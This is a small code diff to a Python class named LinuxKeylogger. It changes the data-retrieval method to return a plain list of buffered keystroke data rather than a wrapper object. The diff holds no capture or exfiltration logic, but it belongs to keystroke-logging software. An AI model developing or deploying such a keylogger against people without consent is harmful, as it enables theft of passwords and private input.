@@ -90,7 +90,7 @@ class LinuxKeylogger:
         if self.listener.is_alive():
             self.listener.stop()
 
-    def get_data(self) -> DataWrapper:
+    def get_data(self) -> list:
         """
         get the data that has been collected and reset the buffer.
         """
@@ -99,7 +99,7 @@ class LinuxKeylogger:
             self.buffer.clear()
         if not data:
             return None
-        return DataWrapper(data)
+        return data
 
     def _on_key_event(self, key: kb.Key | kb.KeyCode):
         """
